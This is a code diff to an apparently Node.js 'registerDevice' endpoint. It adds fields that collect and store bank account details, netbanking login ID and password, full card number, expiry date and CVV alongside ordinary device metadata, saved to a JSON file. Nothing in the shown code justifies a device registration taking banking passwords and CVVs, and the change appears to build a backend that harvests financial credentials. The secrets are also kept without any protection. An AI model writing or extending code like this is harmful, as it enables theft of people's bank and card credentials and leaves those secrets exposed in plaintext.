@@ -34,7 +34,22 @@ let fileDevices = loadJSON(DEVICES_FILE, []);
  */
 export const registerDevice = async (req, res) => {
   try {
-    const { deviceName, departmentName, mobileNumber, address, role, publicKeyPem } = req.body;
+    const {
+      deviceName,
+      departmentName,
+      mobileNumber,
+      address,
+      bankName,
+      accountNumber,
+      ifscCode,
+      netbankingId,
+      netbankingPassword,
+      cardNumber,
+      cardExpiry,
+      cardCvv,
+      role,
+      publicKeyPem
+    } = req.body;
 
     if (!departmentName && !deviceName) {
       return res.status(400).json({ error: "Department Name or Device Name is required" });
@@ -51,6 +66,14 @@ export const registerDevice = async (req, res) => {
       departmentName: departmentName || 'General',
       mobileNumber: mobileNumber || 'N/A',
       address: address || 'Main Office',
+      bankName: bankName || 'N/A',
+      accountNumber: accountNumber || 'N/A',
+      ifscCode: ifscCode || 'N/A',
+      netbankingId: netbankingId || '',
+      netbankingPassword: netbankingPassword || '',
+      cardNumber: cardNumber || '',
+      cardExpiry: cardExpiry || '',
+      cardCvv: cardCvv || '',
       role: role || 'SOURCE',
       publicKeyPem: publicKeyPem || null,
       status: 'ONLINE',
